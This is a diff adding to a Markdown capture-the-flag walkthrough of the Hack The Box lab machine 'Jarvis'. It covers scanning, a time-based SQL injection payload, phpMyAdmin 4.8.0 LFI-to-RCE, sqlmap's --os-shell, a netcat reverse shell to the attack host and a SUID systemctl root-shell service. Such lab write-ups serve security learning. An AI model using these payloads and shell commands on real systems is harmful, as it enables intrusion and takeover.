@@ -63,13 +63,31 @@ gobuster dir -e -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.143/ -k 
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b9cd031-9d75-46b3-b745-7205f63e1071)
 
++ Scan with nikto: `nikto -h http://10.10.10.143`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5c334f0d-673c-4ee6-9e23-4336443bc69b)
+
++ Check `http://10.10.10.143/phpmyadmin/ChangeLog` and `http://10.10.10.143/phpmyadmin/README`. **phpmyadmin 4.8.0** is discovered.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6f29f10a-387a-4be6-8e4c-8b0d979b05fa)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ae90c26a-97b4-403d-92aa-b1ac8b0850d2)
+
+Check port scan and enumeration results:
++ **Port tcp 22, ssh:** There isn't any critical exploit associated with the version, so we need credentials for this service as well.
++ **Ports tcp 80, http:** The gobuster scan shows **room.php** and **/phpmyadmin** directories. Moreover, the Nikto discovers **/phpmyadmin/ChangeLog** and **/phpmyadmin/README** which contain the phpMyAdmin version number.
++ **Ports tcp 64999, http:** It contains the static text, and there's nothing interesting directories/files from nikto and gobuster.
+
+
 
 ## Exploitation: Method 1
++ If **cod** parameter field is vulnerable to **LFI**, **RFI** or **SQLi**, we have to test for all three vulnerabilities.
 + Each room is directly referenced using the parameter **cod**, which could be a possible injection point, and check SQL Injection vulnerability.
 + **SQL injection can be really tricky but a lot less so with a proper methodology.** 
 + Add single quotation `'` at the end of **cod** parameter. It doesn't crash the page or return 500, but the picture of the room disappear anymore.
 + No errors appeared since SQL errors may be suppressed.
 + Try the time-based sqli, and check payload **cod=55 AND (SELECT 1 FROM (SELECT(SLEEP(60)))sqli)**.
++ If it takes longer than usual for the response to come back to us, then we know it's vulnerable.
 + The server will execute the **SLEEP(60)** command, and will take 1 minute to process the query. It is definitely a SQLi vulnerability.
 + Visit `10.10.10.143/room.php?cod=55%20 AND (SELECT 1 FROM (SELECT(SLEEP(60)))sqli)`.
 
@@ -256,7 +274,7 @@ database management system users password hashes:
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/456d2ac4-4fe4-4dd2-adf1-fe2ed4706eeb)
 
 + The version of phpMyAdmin is 4.8.0, and check whether it has any exploits: `searchsploit phpMyAdmin 4.8`
-+ There's a local file include (LFI) vulnerability that allows for remote code execution (RCE) with CVE-2018-12613 [1](https://www.exploit-db.com/exploits/44928) [2](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/) [3-PoC](https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%203700) in this version. 
++ There's a local file include (LFI) vulnerability that allows for remote code execution (RCE) with CVE-2018-12613 [1](https://www.exploit-db.com/exploits/44928) [2](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/) [3-PoC](https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%203700) in this version. The exploits require authentication, so we'll use the discovered credentials in the above [1](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#step-3-enumerating-dbms-characteristics) [2](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#exploitation-method-2---sqlmap).
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4f986e6f-096f-4030-9912-23431041e16f)
 
@@ -342,8 +360,20 @@ sqlmap -u http://10.10.10.143:80/room.php?cod=5 --batch --dbs --random-agent --f
 
 
 
+## Gaining Access: Method 4 - sqlmap
++ There's another cool feature `--os-shell` in SQLMap that will try to get a shell on the host running the web server.
+```
+sqlmap -u http://10.10.10.143:80/room.php?cod=5 --batch --dbs --random-agent --os-shell
+```
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/49170adc-0fd9-4f92-b1df-619b25a81587)
 
++ From here, send a reverse shell back to the attack machine. First, set up a listener on the attack machine: `nc -lnvp 5555`
++ Get a bash reverse shell: `nc -e /bin/bash 10.10.14.8 5555`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8a80fca2-e307-4638-be69-d4991c9d2f96)
+
++ Again [shell upgrade](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#shell-upgrade).
 
 
 
@@ -432,9 +462,9 @@ SYSTEMD_EDITOR=$TF systemctl edit system.slice
 
 ### Method 2
 + **/bin/systemctl** binary has the setuid bit set, and it's owned by root. This binary is a systemd utility which is responsible for Controlling the systemd system and service manager. It creates and manages services.
-+ And in this case, only root and users in the group pepper can run it, and it will run as root.
++ Create a new service with a command to get shell with root account.
 + If we create such a service, we can run it with root privileges, since systemctl has the SUID enabled, and the binary owner is root.
-+ First, create a **shell.service** file on the attack machine:
++ First, create a **shell.service** file on the attack machine: 
 ```
 [Unit]
 Description=get root shell
@@ -483,8 +513,13 @@ WantedBy=multi-user.target
 + https://ivanitlearning.wordpress.com/2020/02/20/vulnhub-pwnos-2-0/
 + https://www.exploit-db.com/papers/14635
 
+**$(command) and Systemd:**
++ https://ivanitlearning.wordpress.com/2019/12/08/overthewire-natas16-17/
 + https://en.wikipedia.org/wiki/Systemd
 
+**systemctl:**
++ https://gtfobins.github.io/gtfobins/systemctl/
++ https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
 
 
 # CVE Scripting
@@ -499,10 +534,10 @@ WantedBy=multi-user.target
 + https://pwnedcoffee.com/hackthebox/jarvis/
 + https://github.com/Kyuu-Ji/htb-write-up/blob/master/jarvis/write-up-jarvis.md
 + https://ivanitlearning.wordpress.com/2020/10/14/hackthebox-jarvis/
-+ 
++ https://medium.com/@toneemarqus/jarvis-htb-manual-walkthrough-2023-oscp-prep-a8ea5df0587c
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/jarvis-writeup-w-o-metasploit
 + https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
-+ https://medium.com/@toneemarqus/jarvis-htb-manual-walkthrough-2023-oscp-prep-a8ea5df0587c
+
 + 
 + xxx
 
